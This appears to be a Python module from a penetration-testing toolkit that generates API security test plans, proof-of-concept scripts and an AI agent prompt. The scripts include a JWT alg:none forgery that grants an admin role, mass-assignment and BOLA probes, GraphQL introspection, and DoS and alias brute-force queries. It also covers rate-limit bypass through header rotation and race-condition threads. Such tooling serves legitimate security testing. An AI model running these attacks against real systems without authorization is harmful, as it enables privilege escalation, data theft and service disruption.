"""
Phase 3B — API Security Testing
=================================
Targets REST and GraphQL APIs.
Generates test plans for BOLA, mass assignment, auth header manipulation,
GraphQL introspection, and business logic flaws.

Agent: penetration-tester + backend-architect
"""

import json
from pathlib import Path
from datetime import datetime


GRAPHQL_INTROSPECTION = """{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields {
        name
        description
        args { name type { name kind } }
        type { name kind }
      }
    }
  }
}"""

GRAPHQL_BATCHING_PROBE = """[
  {"query": "query { me { id email } }"},
  {"query": "query { me { id email } }"},
  {"query": "query { me { id email } }"}
]"""

JWT_NONE_EXAMPLE = """
# Step 1: Decode your JWT (split on '.')
header_b64, payload_b64, signature = token.split('.')

# Step 2: Decode header
import base64, json
header = json.loads(base64.b64decode(header_b64 + '=='))

# Step 3: Modify header
header['alg'] = 'none'
new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()

# Step 4: Modify payload claims as needed
payload = json.loads(base64.b64decode(payload_b64 + '=='))
payload['role'] = 'admin'  # or whatever privilege escalation
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()

# Step 5: Forge token with empty signature
forged_token = f"{new_header}.{new_payload}."

# Step 6: Test
import requests
r = requests.get('TARGET_URL/api/admin', headers={'Authorization': f'Bearer {forged_token}'})
print(r.status_code, r.text[:200])
"""

MASS_ASSIGNMENT_PROBE = """
# Test for mass assignment — add unexpected fields to POST/PUT requests
import requests

# Original request the app sends:
normal_payload = {"username": "alice", "email": "alice@example.com"}

# Mass assignment probes — add privileged fields:
probes = [
    {**normal_payload, "role": "admin"},
    {**normal_payload, "is_admin": True},
    {**normal_payload, "admin": True},
    {**normal_payload, "user_type": "admin"},
    {**normal_payload, "permissions": ["admin", "write"]},
    {**normal_payload, "balance": 99999},
    {**normal_payload, "verified": True},
    {**normal_payload, "plan": "enterprise"},
]

for probe in probes:
    r = requests.post("TARGET_URL/api/register", json=probe,
                      headers={"Authorization": "Bearer YOUR_TOKEN"})
    print(f"Probe {probe}: {r.status_code}")
    if r.status_code in (200, 201):
        # Check if privileged field was accepted
        me = requests.get("TARGET_URL/api/me", headers={"Authorization": f"Bearer {r.json().get('token','')}"})
        print(f"  Me response: {me.text[:300]}")
"""


def run_api_tests(target: str, output_dir: Path) -> None:
    api_dir = output_dir / "api"
    api_dir.mkdir(exist_ok=True)

    print(f"\n[PHASE 3B] API Security Testing — {target}")
    print("=" * 60)

    endpoint_map = _load_endpoint_map(output_dir)
    api_endpoints = endpoint_map.get("api_endpoints", [])

    print(f"  Loaded {len(api_endpoints)} API endpoints from surface map")

    tests = {
        "target": target,
        "timestamp": datetime.utcnow().isoformat(),
        "api_endpoints": [e["url"] for e in api_endpoints],
        "test_categories": [
            _gen_bola_tests(target),
            _gen_mass_assignment_tests(target),
            _gen_graphql_tests(target),
            _gen_auth_header_tests(target),
            _gen_rate_limit_bypass_tests(target),
            _gen_business_logic_tests(target),
        ],
    }

    for cat in tests["test_categories"]:
        print(f"  [+] {cat['name']:40s} — {len(cat['tests'])} test(s)")

    # Save test plan
    plan_file = api_dir / "api_test_plan.json"
    plan_file.write_text(json.dumps(tests, indent=2))

    # Generate PoC scripts
    poc_script = _generate_poc_scripts(target, api_endpoints)
    poc_file = api_dir / "api_poc_scripts.py"
    poc_file.write_text(poc_script)

    # Generate GraphQL test file
    gql_file = api_dir / "graphql_probes.md"
    gql_file.write_text(_generate_graphql_guide(target))

    # Generate agent prompt
    agent_prompt = _generate_agent_prompt(target, api_endpoints)
    agent_file = api_dir / "api_agent_prompt.md"
    agent_file.write_text(agent_prompt)

    print(f"\n[FILES]")
    print(f"  {api_dir}/api_test_plan.json")
    print(f"  {api_dir}/api_poc_scripts.py")
    print(f"  {api_dir}/graphql_probes.md")
    print(f"  {api_dir}/api_agent_prompt.md")
    print(f"\n[NEXT] Run api_poc_scripts.py (update TARGET_URL first)")
    print(f"[NEXT] Use api_agent_prompt.md with penetration-tester agent\n")


def _load_endpoint_map(output_dir: Path) -> dict:
    ep_file = output_dir / "surface" / "endpoint_map.json"
    if ep_file.exists():
        return json.loads(ep_file.read_text())
    return {"api_endpoints": [], "auth_endpoints": []}


def _gen_bola_tests(target: str) -> dict:
    return {
        "name": "BOLA / IDOR (Broken Object Level Authorization)",
        "owasp": "API1:2023",
        "cwe": "CWE-639",
        "tests": [
            {"id": "api-bola-01", "name": "ID manipulation on object endpoints",
             "steps": ["Find endpoints: GET /api/orders/123, /api/users/456",
                       "Change ID to another user's object ID",
                       "403 = authorization check works; 200 with other user's data = BOLA"]},
            {"id": "api-bola-02", "name": "Indirect object reference via other fields",
             "steps": ["Find filters: GET /api/files?user_id=123",
                       "Change user_id to another value",
                       "Also test: account_id, customer_id, tenant_id"]},
            {"id": "api-bola-03", "name": "BOLA in POST body",
             "steps": ["Find endpoints accepting object IDs in body",
                       "{\"order_id\": 123} → change to another user's order_id",
                       "Should return 403, not the order data"]},
        ],
    }


def _gen_mass_assignment_tests(target: str) -> dict:
    return {
        "name": "Mass Assignment (Broken Object Property Level Auth)",
        "owasp": "API6:2023",
        "cwe": "CWE-915",
        "poc": MASS_ASSIGNMENT_PROBE,
        "tests": [
            {"id": "api-mass-01", "name": "Registration mass assignment",
             "steps": ["Add role/admin/is_admin/permissions to registration payload",
                       "Check user profile after registration for privilege grant",
                       "Also test: POST /api/profile, PUT /api/user"]},
            {"id": "api-mass-02", "name": "Profile update mass assignment",
             "steps": ["PUT /api/user/profile with extra fields",
                       "Add: {\"balance\": 99999, \"verified\": true, \"plan\": \"enterprise\"}",
                       "Check if any field was accepted"]},
        ],
    }


def _gen_graphql_tests(target: str) -> dict:
    return {
        "name": "GraphQL Security",
        "owasp": "API8:2023",
        "cwe": "CWE-284",
        "tests": [
            {"id": "api-gql-01", "name": "Introspection enabled",
             "steps": ["POST /graphql with introspection query (see graphql_probes.md)",
                       "If __schema data returned, full API schema is exposed",
                       "Use InQL or graphql-voyager to visualize schema"]},
            {"id": "api-gql-02", "name": "Query batching DoS",
             "steps": ["Send array of identical queries in one request",
                       "Start with 3–5, escalate to 100+ queries",
                       "No rate limit on batch = DoS potential"]},
            {"id": "api-gql-03", "name": "Excessive query depth",
             "steps": ["Craft deeply nested query using circular references",
                       "user { friends { friends { friends { id email } } } }",
                       "Should be rejected by depth limit; if not, DoS possible"]},
            {"id": "api-gql-04", "name": "Field-level auth bypass",
             "steps": ["Query sensitive fields not shown in UI: password, ssn, apiKey",
                       "Even if UI hides fields, check if API returns them in response",
                       "Try alias attacks: { a: password b: password }"]},
        ],
    }


def _gen_auth_header_tests(target: str) -> dict:
    return {
        "name": "Authentication Header Manipulation",
        "owasp": "API2:2023",
        "cwe": "CWE-287",
        "tests": [
            {"id": "api-auth-01", "name": "Missing authentication check",
             "steps": ["Remove Authorization header from authenticated requests",
                       "Check if 401 is returned or data is still served"]},
            {"id": "api-auth-02", "name": "JWT algorithm confusion",
             "steps": ["See api_poc_scripts.py — jwt_none_attack() function",
                       "Modify alg to 'none', strip signature, test acceptance"]},
            {"id": "api-auth-03", "name": "API key exposure",
             "steps": ["Check response bodies for api_key, token, secret fields",
                       "Check Swagger/OpenAPI docs for example API keys",
                       "Check error responses — some include debug info with keys"]},
            {"id": "api-auth-04", "name": "Version rollback (auth bypass)",
             "steps": ["Test older API versions: /api/v1/ vs /api/v2/",
                       "Older versions often lack security controls",
                       "Try: /api/v0/, /v1/, /api/legacy/, /api/old/"]},
        ],
    }


def _gen_rate_limit_bypass_tests(target: str) -> dict:
    return {
        "name": "Rate Limit Bypass",
        "owasp": "API4:2023",
        "cwe": "CWE-770",
        "tests": [
            {"id": "api-rate-01", "name": "IP rotation via X-Forwarded-For",
             "steps": ["Send rapid requests with X-Forwarded-For: <rotating_IP>",
                       "If rate limit resets with header change, IP-based limiting is bypassable"]},
            {"id": "api-rate-02", "name": "User-agent rotation",
             "steps": ["Rotate User-Agent headers across requests",
                       "Check if rate limit tracks by User-Agent vs IP"]},
            {"id": "api-rate-03", "name": "Parameter pollution",
             "steps": ["Duplicate parameters in request: ?id=1&id=2",
                       "Send request twice with slight variations to bypass de-dup cache"]},
        ],
    }


def _gen_business_logic_tests(target: str) -> dict:
    return {
        "name": "Business Logic Flaws",
        "owasp": "API4:2023",
        "cwe": "CWE-840",
        "tests": [
            {"id": "api-logic-01", "name": "Negative value attacks",
             "steps": ["Submit negative values for quantity, price, amount",
                       "{\"quantity\": -1} → should this give credit instead of debit?",
                       "Test in e-commerce, banking, or subscription contexts"]},
            {"id": "api-logic-02", "name": "Workflow step skipping",
             "steps": ["Map the intended workflow (step 1→2→3)",
                       "Try jumping directly to step 3 without completing prerequisites",
                       "E.g., skip email verification and go directly to paid features"]},
            {"id": "api-logic-03", "name": "Race condition",
             "steps": ["Find operations that should be atomic (payments, balance deductions)",
                       "Send parallel requests simultaneously (Python threading or async)",
                       "Check if resource is double-spent / double-credited"]},
        ],
    }


def _generate_poc_scripts(target: str, api_endpoints: list) -> str:
    ep_urls = "\n".join(f'    "{e["url"]}",' for e in api_endpoints[:10]) or '    # No endpoints loaded — run Phase 2 first'
    return f'''#!/usr/bin/env python3
"""
API Security PoC Scripts — {target}
Generated: {datetime.utcnow().isoformat()}

Update TARGET_URL and YOUR_TOKEN before running.
"""

import requests
import json
import base64
import threading
import time

TARGET_URL = "{target}"
YOUR_TOKEN = "REPLACE_WITH_YOUR_JWT_OR_TOKEN"

HEADERS = {{
    "Authorization": f"Bearer {{YOUR_TOKEN}}",
    "Content-Type": "application/json",
}}

API_ENDPOINTS = [
{ep_urls}
]


# ============================================================
# BOLA Testing
# ============================================================

def test_bola(endpoint: str, id_range: range = range(1, 20)):
    """Test Broken Object Level Authorization by iterating IDs."""
    print(f"\\n[BOLA] Testing {{endpoint}}")
    for obj_id in id_range:
        url = f"{{endpoint}}/{{obj_id}}"
        r = requests.get(url, headers=HEADERS, timeout=10)
        if r.status_code == 200:
            print(f"  [FOUND] {{url}} → {{r.status_code}}")
            print(f"  Response: {{r.text[:200]}}")


# ============================================================
# JWT alg:none Attack
# ============================================================
{JWT_NONE_EXAMPLE}

def jwt_none_attack(token: str, extra_claims: dict = None) -> str:
    """Forge JWT with alg:none — returns forged token."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Not a JWT")
    header = json.loads(base64.b64decode(parts[0] + "=="))
    payload = json.loads(base64.b64decode(parts[1] + "=="))
    header["alg"] = "none"
    if extra_claims:
        payload.update(extra_claims)
    def b64url(data):
        return base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).rstrip(b"=").decode()
    return f"{{b64url(header)}}.{{b64url(payload)}}."


# ============================================================
# Mass Assignment Probe
# ============================================================
{MASS_ASSIGNMENT_PROBE}


# ============================================================
# GraphQL Introspection
# ============================================================

def graphql_introspect(url: str = None):
    """Test if GraphQL introspection is enabled."""
    gql_url = url or f"{{TARGET_URL}}/graphql"
    query = {json.dumps({"query": GRAPHQL_INTROSPECTION.strip()})}
    r = requests.post(gql_url, json={{"query": "__schema {{ queryType {{ name }} }}"}}, headers=HEADERS)
    print(f"\\n[GraphQL Introspection] {{gql_url}} → {{r.status_code}}")
    if r.status_code == 200 and "__schema" in r.text:
        print("  [VULN] Introspection ENABLED — full schema exposed")
        print(f"  Schema preview: {{r.text[:500]}}")
    else:
        print("  [OK] Introspection appears disabled")


def graphql_batch_test(url: str = None, count: int = 50):
    """Test GraphQL query batching for DoS potential."""
    gql_url = url or f"{{TARGET_URL}}/graphql"
    batch = [{{"query": "{{ __typename }}"}}] * count
    start = time.time()
    r = requests.post(gql_url, json=batch, headers=HEADERS)
    elapsed = time.time() - start
    print(f"\\n[GraphQL Batch] {{count}} queries → {{r.status_code}} in {{elapsed:.2f}}s")


# ============================================================
# Race Condition Test
# ============================================================

def race_condition_test(endpoint: str, payload: dict, thread_count: int = 10):
    """Send concurrent requests to test for race conditions."""
    results = []
    def send():
        r = requests.post(endpoint, json=payload, headers=HEADERS)
        results.append((r.status_code, r.text[:100]))

    threads = [threading.Thread(target=send) for _ in range(thread_count)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print(f"\\n[Race Condition] {{thread_count}} concurrent requests to {{endpoint}}")
    for code, body in results:
        print(f"  {{code}}: {{body}}")


# ============================================================
# Run all probes
# ============================================================

if __name__ == "__main__":
    print(f"API Security PoC — {{TARGET_URL}}")
    print("=" * 60)
    print("Update TARGET_URL and YOUR_TOKEN before running.")
    print()
    print("Available functions:")
    print("  test_bola(endpoint, id_range)")
    print("  jwt_none_attack(token, extra_claims)")
    print("  graphql_introspect(url)")
    print("  graphql_batch_test(url, count)")
    print("  race_condition_test(endpoint, payload)")
'''


GRAPHQL_INTROSPECTION = """{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name kind
      fields { name type { name kind } }
    }
  }
}"""


def _generate_graphql_guide(target: str) -> str:
    return f"""# GraphQL Security Test Guide — {target}

## 1. Introspection Query

Send via cURL or Puppeteer:

```bash
curl -X POST {target}/graphql \\
  -H "Content-Type: application/json" \\
  -H "Authorization: Bearer YOUR_TOKEN" \\
  -d '{{"query": "{{ __schema {{ queryType {{ name }} }} }}"}}'
```

If `__schema` data returns → introspection enabled → full schema exposed.

## 2. Full Introspection (paste into GraphQL playground)

```graphql
{GRAPHQL_INTROSPECTION}
```

## 3. Batching Probe

```json
{GRAPHQL_BATCHING_PROBE}
```

## 4. Field enumeration (bypass auth on sensitive fields)

```graphql
{{
  users {{
    id
    email
    password
    apiKey
    secretToken
    ssn
    phoneNumber
  }}
}}
```

## 5. Alias-based brute force

```graphql
{{
  a1: login(username: "admin", password: "admin")
  a2: login(username: "admin", password: "password")
  a3: login(username: "admin", password: "123456")
  # ... add more aliases
}}
```

## 6. Circular/deeply nested query DoS

```graphql
{{
  user {{
    friends {{
      friends {{
        friends {{
          friends {{
            id email
          }}
        }}
      }}
    }}
  }}
}}
```
"""
